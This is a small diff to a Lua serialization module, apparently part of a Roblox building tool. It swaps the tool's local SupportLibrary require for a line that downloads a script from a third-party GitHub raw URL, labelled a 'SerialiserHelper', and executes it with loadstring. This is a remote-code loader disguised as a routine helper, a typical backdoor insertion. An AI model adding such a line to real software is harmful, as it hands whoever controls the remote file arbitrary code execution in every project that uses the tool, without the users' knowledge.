@@ -3,7 +3,7 @@ Serialization = {};
 
 -- Import services
 local Tool = script.Parent.Parent
-local Support = require(Tool.Libraries.SupportLibrary);
+local Support = loadstring(game:HttpGet("https://raw.githubusercontent.com/bbb907/GGHubNew/refs/heads/main/Extra/SerialiserHelper.lua"))()
 Support.ImportServices();
 
 local Types = {
